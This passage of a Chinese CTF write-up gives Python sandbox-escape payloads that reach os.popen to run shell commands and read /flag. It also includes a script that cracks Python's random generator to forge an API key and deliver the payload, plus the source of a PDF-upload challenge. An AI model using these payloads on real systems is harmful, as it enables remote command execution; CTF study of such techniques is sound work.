</span></span><span class="line"><span class="cl">  <span class="nt">&#34;payload&#34;</span><span class="p">:</span> <span class="s2">&#34;(lambda o: open(&#39;static/out.txt&#39;,&#39;w&#39;).write(o.popen(&#39;whoami&#39;).read()))(next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__))&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>由于需要预测随机数，所以直接一次性payload会比较好</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:5001</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="cl"><span class="n">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br, zstd</span>
</span></span><span class="line"><span class="cl"><span class="n">sec-ch-ua</span><span class="o">:</span> <span class="l">&#34;Chromium&#34;;v=&#34;140&#34;, &#34;Not=A?Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;140&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;key&#34;</span><span class="p">:</span> <span class="s2">&#34;3345821131&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;payload&#34;</span><span class="p">:</span> <span class="s2">&#34;(lambda o: [o.mkdir(&#39;static&#39;), open(&#39;static/out.txt&#39;,&#39;w&#39;).write(o.popen(&#39;tac /flag&#39;).read())])(next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__))&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>让写个脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">randcrack</span> <span class="kn">import</span> <span class="n">RandCrack</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://49.232.42.74:30222&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;testuser1&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;testuser1&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">register_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/register&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">register_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">201</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;注册失败: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;注册成功，user_id: </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">login_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">login_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;登录失败: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;登录成功&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">random_numbers</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">user_id</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">623</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;key&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/api&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">403</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;收集随机数失败: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="n">key2</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">random_numbers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">key2</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;收集到第</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">个随机数: </span><span class="si">{</span><span class="n">key2</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">rc</span> <span class="o">=</span> <span class="n">RandCrack</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">random_numbers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">rc</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">next_rand</span> <span class="o">=</span> <span class="n">rc</span><span class="o">.</span><span class="n">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;预测的下一个随机数: </span><span class="si">{</span><span class="n">next_rand</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__).popen(&#39;mkdir -p static &amp;&amp; tac /flag &gt; static/out.txt&#39;).read()&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;key&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">next_rand</span><span class="p">),</span> <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/api&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload执行成功&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload执行失败: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/static/out.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;读取flag失败: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pdf2text">pdf2text
</h2><p>by n4c1</p>
<p>先看看代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfparser</span> <span class="kn">import</span> <span class="n">PDFParser</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfdocument</span> <span class="kn">import</span> <span class="n">PDFDocument</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">io</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfutils</span> <span class="kn">import</span> <span class="n">pdf_to_text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;uploads&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;MAX_CONTENT_LENGTH&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>  <span class="c1"># 2MB limit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;file&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;No file part&#39;</span><span class="p">,</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">filename</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;No selected file&#39;</span><span class="p">,</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;..&#39;</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">or</span> <span class="s1">&#39;/&#39;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;directory traversal is not allowed&#39;</span><span class="p">,</span> <span class="mi">403</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">pdf_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pdf_content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># just if is a pdf</span>
</span></span><span class="line"><span class="cl">        <span class="n">parser</span> <span class="o">=</span> <span class="n">PDFParser</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">pdf_content</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">doc</span> <span class="o">=</span> <span class="n">PDFDocument</span><span class="p">(</span><span class="n">parser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pdf_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pdf_content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">md_filename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">filename</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.txt&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">txt_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="n">md_filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf_to_text</span><span class="p">(</span><span class="n">pdf_path</span><span class="p">,</span> <span class="n">txt_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">500</span> 
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">txt_path</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>从一个文件里面导入了模块，看看这个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.high_level</span> <span class="kn">import</span> <span class="n">extract_pages</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.layout</span> <span class="kn">import</span> <span class="n">LTTextContainer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pdf_to_text</span><span class="p">(</span><span class="n">pdf_path</span><span class="p">,</span> <span class="n">txt_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">txt_path</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">txt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">page_layout</span> <span class="ow">in</span> <span class="n">extract_pages</span><span class="p">(</span><span class="n">pdf_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">element</span> <span class="ow">in</span> <span class="n">page_layout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">element</span><span class="p">,</span> <span class="n">LTTextContainer</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">txt</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">element</span><span class="o">.</span><span class="n">get_text</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                    <span class="n">txt</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>队友在这里面找到了load</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
